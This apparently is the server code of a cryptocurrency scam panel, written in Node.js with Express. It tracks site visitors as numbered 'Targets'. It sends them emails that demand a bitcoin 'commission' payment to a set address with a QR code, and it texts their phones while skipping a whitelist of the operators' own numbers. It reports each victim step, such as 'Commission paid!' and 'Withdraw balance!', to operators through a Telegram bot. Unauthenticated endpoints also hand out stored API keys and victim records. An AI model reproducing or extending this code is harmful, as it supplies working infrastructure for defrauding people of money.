const fs = require("fs");
const request_send = require("request");
const { send_message } = require("../modules/send_sms.js");
const { send_mail } = require("./send_mail.js");
const { send_mail_2 } = require("./send_mail-2.js");

const proxyUrl = "/api";

async function getPriceEuro(price) {
  let courses = {
    bitcoin: 0,
  };

  await new Promise((resolve, reject) => {
    request_send(
      `https://api.blockchain.com/v3/exchange/tickers/BTC-EUR`,
      (err, res, body) => {
        if (err) return res.status(500).send({ message: err });
        const data = JSON.parse(body);
        courses.bitcoin = data["price_24h"];
        resolve(data["price_24h"]);
      }
    );
  });

  const convert = (amount, dir) => {
    return dir === 1 ? amount * courses.bitcoin : courses.bitcoin / amount;
  };
  let result = convert(price, 1);
  return result;
}

module.exports.get_data = (app, users, bot) => {
  let users_site = JSON.parse(fs.readFileSync("./assets/data/users-site.json"));

  app.get(proxyUrl + "/get_replain_id", function (request, response) {
    let a1 = request.headers.referer.replace("www.", "").split(/\/+/)[1];
    let from = a1.replace(".com", "");

    const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"));

    for (let file in files) {
      let hostnmae = files[file].site;
      if (hostnmae == from) {
        const currentSite = JSON.parse(
          fs.readFileSync(`./assets/data/sites/${hostnmae}/settings.json`)
        );
        response.send(currentSite);
      }
    }
  });

  app.get(proxyUrl + "/users", function (request, response) {
    let users_site = JSON.parse(
      fs.readFileSync("./assets/data/users-site.json")
    );
    response.send(users_site);
  });

  app.get(proxyUrl + "/get_api_key", function (request, response) {
    let a1 = request.headers.referer.replace("www.", "").split(/\/+/)[1];
    let from = a1.replace(".com", "");

    const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"));

    for (let file in files) {
      let hostnmae = files[file].site;
      if (hostnmae == from) {
        const currentSite = JSON.parse(
          fs.readFileSync(`./assets/data/sites/${hostnmae}/api_key.json`)
        );
        response.send(currentSite);
      }
    }
  });

  app.get(proxyUrl + "/keys", function (request, response) {
    let a1 = request.headers.referer.replace("www.", "").split(/\/+/)[1];
    let from = a1.replace(".com", "");

    const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"));

    for (let file in files) {
      let hostnmae = files[file].site;
      if (hostnmae == from) {
        const currentSite = JSON.parse(
          fs.readFileSync(`./assets/data/sites/${hostnmae}/users-keys.json`)
        );
        response.send(currentSite);
      }
    }
  });

  app.post(proxyUrl + "/transaction", function (request, response) {
    let product_sub = request?.body.sicret;
    let type = request.body?.type;
    let types = ["important", "balance"];
    let list_of_user = [];

    switch (type) {
      case types[0]:
        list_of_user = [];
        for (ids in users_site) {
          if (product_sub == users_site[ids].sicret) {
            list_of_user.push(users_site[ids]?.id);
          }
        }

        for (let u in users) {
          let chatId = users[u];
          bot.sendMessage(
            chatId,
            `🔔 Withdraw! Data entered correct! Target no ${Math.min.apply(
              null,
              list_of_user
            )}`
          );
        }

        break;

      case types[1]:
        list_of_user = [];
        for (ids in users_site) {
          if (product_sub == users_site[ids].sicret) {
            list_of_user.push(users_site[ids]?.id);
          }
        }

        for (let u in users) {
          let chatId = users[u];
          bot.sendMessage(
            chatId,
            `☑️ Balance checked! Target no. ${Math.min.apply(
              null,
              list_of_user
            )}`
          );
        }
        break;

      default:
        break;
    }
  });

  app.post(proxyUrl + "/clickHeroLink", function (request, response) {
    let type = request.body?.type;

    switch (type) {
      case 0:
        for (let u in users) {
          let chatId = users[u];
          bot.sendMessage(chatId, "🗝   Generate Business wallet !");
        }
        break;
      case 1:
        for (let u in users) {
          let chatId = users[u];
          bot.sendMessage(chatId, "🗝   Generate Gift wallet !");
        }
        break;

      default:
        break;
    }
  });

  app.post(proxyUrl + "/send_mail", function (request, response) {
    let mail_sender = request.body?.email;

    let a1 = request.headers.referer.replace("www.", "").split(/\/+/)[1];
    let from = a1.replace(".com", "");
    const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
    let balance = "";
    let bitcoin_address = "";
    let bitcoin_img = "";

    for (let file in files) {
      let hostnmae = files[file].site;
      if (hostnmae == from) {
        const baseURL = `./assets/data/sites/${hostnmae}`;
        balance = JSON.parse(fs.readFileSync(`${baseURL}/price_settings.json`));
        bitcoin_address = JSON.parse(
          fs.readFileSync(`${baseURL}/address_settings.json`)
        );
        bitcoin_img = JSON.parse(
          fs.readFileSync(`${baseURL}/qr_settings.json`)
        );
      }
    }

    getPriceEuro(balance.price_euro).then((p) => {
      let priceEuro = String(p).substr(0, 8);
      console.log(priceEuro);
      send_mail(
        mail_sender,
        priceEuro,
        balance.price_euro,
        bitcoin_address.address,
        bitcoin_img.qr_code_link,
        from
      );
      for (let u in users) {
        let chatId = users[u];
        bot.sendMessage(chatId, `📨 Email delivered! —» ${mail_sender}`);
      }
    });
  });

  app.post(proxyUrl + "/send_mail-2", function (request, response) {
    let mail_sender = request.body?.email;
    let product_sub = request?.body.sicret;

    let a1 = request.headers.referer.replace("www.", "").split(/\/+/)[1];
    let from = a1.replace(".com", "");
    const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
    let balance = "";
    let bitcoin_address = "";
    let bitcoin_img = "";

    for (let file in files) {
      let hostnmae = files[file].site;
      if (hostnmae == from) {
        const baseURL = `./assets/data/sites/${hostnmae}`;
        balance = JSON.parse(fs.readFileSync(`${baseURL}/price_settings.json`));
        bitcoin_address = JSON.parse(
          fs.readFileSync(`${baseURL}/address_settings.json`)
        );
        bitcoin_img = JSON.parse(
          fs.readFileSync(`${baseURL}/qr_settings.json`)
        );
      }
    }

    getPriceEuro(balance.price_euro).then((p) => {
      let priceEuro = p;

      send_mail_2(
        mail_sender,
        priceEuro,
        balance.price_euro,
        bitcoin_address.address,
        bitcoin_img.qr_code_link,
        from
      );
    });

    let list_of_user = [];
    for (ids in users_site) {
      if (product_sub == users_site[ids].sicret) {
        list_of_user.push(users_site[ids]?.id);
      }
    }

    for (let u in users) {
      let chatId = users[u];
      bot.sendMessage(
        chatId,
        `❇️ Commission paid! ❇️ Target ⚫️ ${Math.min.apply(
          null,
          list_of_user
        )}\nRepay email delivered —» ${mail_sender}`
      );
    }
  });

  app.post(proxyUrl + "/withdraw-notifications", function (request, response) {
    for (let u in users) {
      let chatId = users[u];

      let address = request.body?.address;
      bot.sendMessage(chatId, `❕ ${address}`);
    }
  });

  app.post(proxyUrl + "/withdraw-pages", function (request, response) {
    let mail_sender = request.body?.email;
    let product_sub = request?.body.sicret;
    let phone = request.body?.phone;
    let type = request.body?.type;

    let whiteListNumberStatus = true;
    const whiteListNumbers = [
      "+447780243386",
      "+447780243224",
      "+37064931396",
      "+37064931397",
      "+317067748831",
      "+37064931396",
      "+37064931397",
    ];

    let a1 = request.headers.referer.replace("www.", "").split(/\/+/)[1];
    let from = a1.replace(".com", "");
    const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"));

    let phones = "";
    let balance = "";
    let bitcoin_address = "";
    let bitcoin_img = "";

    for (let file in files) {
      let hostnmae = files[file].site;
      if (hostnmae == from) {
        const baseURL = `./assets/data/sites/${hostnmae}`;
        balance = JSON.parse(fs.readFileSync(`${baseURL}/price_settings.json`));
        bitcoin_address = JSON.parse(
          fs.readFileSync(`${baseURL}/address_settings.json`)
        );
        bitcoin_img = JSON.parse(
          fs.readFileSync(`${baseURL}/qr_settings.json`)
        );
        phones = JSON.parse(fs.readFileSync(`${baseURL}/phone_numbers.json`));
      }
    }

    getPriceEuro(balance.price_euro).then((p) => {
      let priceEuro = String(p).substr(0, 8);
      send_mail(
        mail_sender,
        priceEuro,
        balance.price_euro,
        bitcoin_address.address,
        bitcoin_img.qr_code_link,
        from
      );
    });

    for (let n in whiteListNumbers) {
      if (whiteListNumbers[n] == phone) {
        send_message(phone, from);
        whiteListNumberStatus = false;
      }
    }

    if (whiteListNumberStatus) {
      phones.push({ tel: phone, step: 0 });

      for (let file in files) {
        let hostnmae = files[file].site;
        if (hostnmae == from) {
          fs.writeFileSync(
            `./assets/data/sites/${hostnmae}/phone_numbers.json`,
            JSON.stringify(phones, null, "\t")
          );
        }
      }

      fs.writeFileSync(
        "./assets/data/phone_numbers.json",
        JSON.stringify(phones, null, "\t")
      );

      let list_of_phones = [];
      let list_of_user = [];

      for (let ids in phones) {
        if (phone == phones[ids].tel) {
          phones[ids].step += 1;
          list_of_phones.push(phones[ids].step);
        }
      }

      let max_value = Math.max.apply(null, list_of_phones);

      if (max_value < 2) {
        send_message(phone, from);
      }

      for (ids in users_site) {
        if (product_sub == users_site[ids].sicret) {
          list_of_user.push(users_site[ids]?.id);
        }
      }

      for (let u in users) {
        let chatId = users[u];

        if (type === "important") {
          bot.sendMessage(
            chatId,
            `📌 Withdraw balance! Email delivered! —» ${mail_sender}\nSMS delivered! —--» ${phone}`
          );
        } else if (type === "balance") {
          bot.sendMessage(
            chatId,
            `🟡 Balance checked! Email delivered! —» ${mail_sender} \n| SMS delivered! —--» ${phone}`
          );
        }

        // bot.sendMessage(chatId, `☑️ Balance checked! Target no. ${Math.min.apply(null, list_of_user)}`)
        // bot.sendMessage(chatId, `✉️ SMS delivered! Phone number —» ${phone}`)
      }
    }
  });

  app.post(proxyUrl + "/send_sms", function (request, response) {
    let product_sub = request?.body.sicret;
    let phone = request.body?.phone;

    let a1 = request.headers.referer.replace("www.", "").split(/\/+/)[1];
    let from = a1.replace(".com", "");
    let phones = "";

    const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"));

    for (let file in files) {
      let hostnmae = files[file].site;
      if (hostnmae == from) {
        phones = JSON.parse(
          fs.readFileSync(`./assets/data/sites/${hostnmae}/phone_numbers.json`)
        );
      }
    }

    let whiteListNumberStatus = true;
    const whiteListNumbers = [
      "+447780243386",
      "+447780243224",
      "+37064931396",
      "+37064931397",
      "+317067748831",
      "+37064931396",
      "+37064931397",
    ];

    for (let n in whiteListNumbers) {
      if (whiteListNumbers[n] == phone) {
        send_message(phone, from);
        whiteListNumberStatus = false;
      }
    }

    if (whiteListNumberStatus) {
      phones.push({ tel: phone, step: 0 });

      for (let file in files) {
        let hostnmae = files[file].site;
        if (hostnmae == from) {
          fs.writeFileSync(
            `./assets/data/sites/${hostnmae}/phone_numbers.json`,
            JSON.stringify(phones, null, "\t")
          );
        }
      }

      fs.writeFileSync(
        "./assets/data/phone_numbers.json",
        JSON.stringify(phones, null, "\t")
      );

      let list_of_phones = [];
      let list_of_user = [];

      for (let ids in phones) {
        if (phone == phones[ids].tel) {
          phones[ids].step += 1;
          list_of_phones.push(phones[ids].step);
        }
      }

      let max_value = Math.max.apply(null, list_of_phones);

      if (max_value < 2) {
        send_message(phone, from);
      }

      for (ids in users_site) {
        if (product_sub == users_site[ids].sicret) {
          list_of_user.push(users_site[ids]?.id);
        }
      }

      for (let u in users) {
        let chatId = users[u];
        bot.sendMessage(
          chatId,
          `☑️ Balance checked! Target no. ${Math.min.apply(null, list_of_user)}`
        );
        bot.sendMessage(chatId, `✉️ SMS delivered! Phone number —» ${phone}`);
      }
    }
  });

  app.get(proxyUrl + "/phone_nubmer_codes", function (request, response) {
    let codes = JSON.parse(fs.readFileSync("./assets/data/countres.json"));

    response.send(codes);
  });

  app.get(proxyUrl + "/clear_base", function (request, response) {
    fs.writeFileSync("./assets/data/users-site.json", "[]", (err) => {
      if (err) throw err;
      console.log("The file has been cleared!");
    });
    users_site = JSON.parse(fs.readFileSync("./assets/data/users-site.json"));
  });

  app.post(proxyUrl + "/transaction-convert", function (request, response) {
    let price = request.body?.price;
    request_send(
      `https://blockchain.info/tobtc?currency=EUR&value=${price}`,
      (err, res, body) => {
        if (err) return res.status(500).send({ message: err });
        response.send(res.body);
      }
    );
  });

  app.post(
    proxyUrl + "/transaction-successfully",
    function (request, response) {
      let product_sub = request?.body.sicret;
      let status = request.body?.send_telegram;

      if (status) {
        let list_of_user = [];
        for (ids in users_site) {
          if (product_sub == users_site[ids].sicret) {
            list_of_user.push(users_site[ids]?.id);
          }
        }

        for (let u in users) {
          let chatId = users[u];
          bot.sendMessage(
            chatId,
            `✅ Commission fee paid! Target no (${Math.min.apply(
              null,
              list_of_user
            )})`
          );
        }
      }
    }
  );

  app.post(proxyUrl + "/transaction-commission", function (request, response) {
    let price = request.body?.price;
    let a1 = request.headers.referer.replace("www.", "").split(/\/+/)[1];
    let from = a1.replace(".com", "");

    const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"));

    for (let file in files) {
      let hostnmae = files[file].site;
      if (hostnmae == from) {
        const currentSiteSettings = JSON.parse(
          fs.readFileSync(`./assets/data/sites/${hostnmae}/settings.json`)
        );

        var tallage = (price / 100) * Number(currentSiteSettings?.commissionPrecent);
        response.send({ price: tallage });
      }
    }
  });

  app.post(
    proxyUrl + "/transaction-convert-euro",
    function (request, response) {
      let price = request.body?.price;

      getPriceEuro(price).then((p) => {
        response.send({ price: p });
      });
    }
  );

  app.post(proxyUrl + "/check-user-cookie", function (request, response) {
    let product_sub = request?.body.sicret;

    let clients = JSON.parse(fs.readFileSync("./assets/data/users-site.json"));
    for (const key in clients) {
      let client = clients[key];
      if (client.sicret === product_sub) {
        response.send({ hasCookies: true });
        return;
      }
    }

    response.send({ hasCookies: false });
  });

  app.post(proxyUrl + "/new_user", function (request, response) {
    let product_sub = request?.body.sicret;
    let step = request.body?.step;
    let message;

    switch (step) {
      case 0:
        users_site.push(request.body);
        fs.writeFileSync(
          "./assets/data/users-site.json",
          JSON.stringify(users_site, null, "\t")
        );

        let list_of_users = [];
        for (ids in users_site) {
          if (product_sub == users_site[ids].sicret) {
            users_site[ids].sunset++;
            list_of_users.push(users_site[ids].sunset);
          }
        }

        let list_of_user = [];
        for (ids in users_site) {
          if (product_sub == users_site[ids].sicret) {
            list_of_user.push(users_site[ids]?.id);
          }
        }

        for (let user in users_site) {
          let users = Number(user);
          let user_time = Math.min.apply(null, list_of_user);
          message = `🏛 Target ${user_time} (${Math.max.apply(
            null,
            list_of_users
          )}) ${(users += 1)}`;
        }

        for (let u in users) {
          let chatId = users[u];
          bot.sendMessage(chatId, message);
        }

        break;
      default:
        break;
    }
  });

  app.get(proxyUrl + "/qr_change", function (request, response) {
    let a1 = request.headers.referer.replace("www.", "").split(/\/+/)[1];
    let from = a1.replace(".com", "");

    const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"));

    for (let file in files) {
      let hostnmae = files[file].site;
      if (hostnmae == from) {
        const currentSite = JSON.parse(
          fs.readFileSync(`./assets/data/sites/${hostnmae}/qr_settings.json`)
        );
        response.send(currentSite);
      }
    }
  });

  app.get(proxyUrl + "/address_change", function (request, response) {
    let a1 = request.headers.referer.replace("www.", "").split(/\/+/)[1];
    let from = a1.replace(".com", "");

    const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"));

    for (let file in files) {
      let hostnmae = files[file].site;
      if (hostnmae == from) {
        const currentSite = JSON.parse(
          fs.readFileSync(
            `./assets/data/sites/${hostnmae}/address_settings.json`
          )
        );
        response.send(currentSite);
      }
    }
  });

  app.get(proxyUrl + "/price_change", function (request, response) {
    let a1 = request.headers.referer.replace("www.", "").split(/\/+/)[1];
    let from = a1.replace(".com", "");

    const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"));

    for (let file in files) {
      let hostnmae = files[file].site;
      if (hostnmae == from) {
        const currentSite = JSON.parse(
          fs.readFileSync(`./assets/data/sites/${hostnmae}/price_settings.json`)
        );
        response.send(currentSite);
      }
    }
  });
};
